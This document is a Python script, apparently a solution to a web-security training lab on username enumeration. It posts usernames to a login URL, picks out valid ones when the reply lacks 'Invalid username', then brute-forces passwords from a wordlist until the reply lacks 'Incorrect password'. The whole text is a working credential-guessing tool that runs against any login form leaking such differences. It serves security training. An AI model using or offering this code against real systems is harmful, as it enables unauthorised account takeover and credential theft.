# Created by sm6r, 2024
# Lab: Username enumeration via different responses

import requests
import sys
if len(sys.argv)!=2:
    print("Usage : solution.py LOGIN_URL")
    exit()


url = sys.argv[1]
usernames = open("./usernames.txt","r")
passwords = open("./passwords.txt","r")
flag = True


for username in usernames.readlines():
    if flag:
        username = username.strip()
        response = requests.post(url,{'username':username,'password':'xxxxx'})
        print(f"Username: ",end="")
        print(f"{username}",end="  "*len(username)+"\r",flush=True)

        if response.text.find("Gateway Timeout") !=-1:
            print("the URL isn't valid.... ")
            exit()

        if response.text.find("Invalid username") == -1:
            print(f"Username: {username} ")

            for password in passwords.readlines():
                password = password.strip()
                response = requests.post(url,{'username':username,'password':password})
                print(f"Password: ",end="")
                print(f"{password}",end=" "*len(password)+"\r",flush=True)

                if response.text.find("Incorrect password") == -1:
                    print(f"\n\nFound valid credentials!! ")
                    flag=False
                    break

    else:
        print("ATTACK DONE SUCCESSFULLY...")
        break

     





